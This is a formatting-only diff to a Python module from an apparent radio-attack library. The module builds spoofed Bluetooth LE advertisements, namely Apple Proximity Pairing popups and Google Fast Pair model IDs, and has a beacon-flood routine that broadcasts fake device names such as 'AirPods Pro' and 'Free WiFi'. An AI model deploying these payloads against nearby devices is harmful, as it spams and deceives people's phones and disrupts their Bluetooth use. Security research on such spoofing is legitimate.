@@ -23,7 +23,6 @@ from typing import Optional
 from feralrf.enums import PHY
 from feralrf.radio import Radio
 
-
 # ─── Payload Builders ───
 
 
@@ -63,16 +62,21 @@ def build_apple_proximity_payload(model: tuple = (0x02, 0x20)) -> bytes:
     NOTE: No Flags AD included — adding Flags breaks popup on some devices.
     """
     payload = bytearray()
-    payload += bytes([
-        0x1A, 0xFF,             # Manufacturer Specific (26 bytes)
-        0x4C, 0x00,             # Apple Company ID
-        0x07,                   # Proximity Pairing type
-        0x19,                   # Length
-        0x07,                   # Status flags
-        model[0], model[1],     # Device model
-        0x75,                   # Status
-        0x00,                   # Battery case
-    ])
+    payload += bytes(
+        [
+            0x1A,
+            0xFF,  # Manufacturer Specific (26 bytes)
+            0x4C,
+            0x00,  # Apple Company ID
+            0x07,  # Proximity Pairing type
+            0x19,  # Length
+            0x07,  # Status flags
+            model[0],
+            model[1],  # Device model
+            0x75,  # Status
+            0x00,  # Battery case
+        ]
+    )
     payload += os.urandom(14)  # Random padding
     return bytes(payload)
 
@@ -84,7 +88,7 @@ def build_google_fastpair_payload(model_id: int = 0x2C01A2) -> bytes:
     Format matches real device captures: [TX_Power][ServiceData(UUID+ModelID)]
     """
     payload = bytearray()
-    payload += bytes([0x02, 0x0A, 0xF6])            # TX Power: -10 dBm
+    payload += bytes([0x02, 0x0A, 0xF6])  # TX Power: -10 dBm
     model_bytes = model_id.to_bytes(3, "big")
     payload += bytes([len(model_bytes) + 3, 0x16, 0x2C, 0xFE])  # Service Data header
     payload += model_bytes
@@ -127,8 +131,14 @@ def beacon_flood(
     """
     if names is None:
         names = [
-            "Free WiFi", "AirPods Pro", "Galaxy Buds", "Bose QC45",
-            "JBL Flip 6", "AirTag Found", "TV Samsung", "Pixel Buds",
+            "Free WiFi",
+            "AirPods Pro",
+            "Galaxy Buds",
+            "Bose QC45",
+            "JBL Flip 6",
+            "AirTag Found",
+            "TV Samsung",
+            "Pixel Buds",
         ]
 
     total_sent = 0
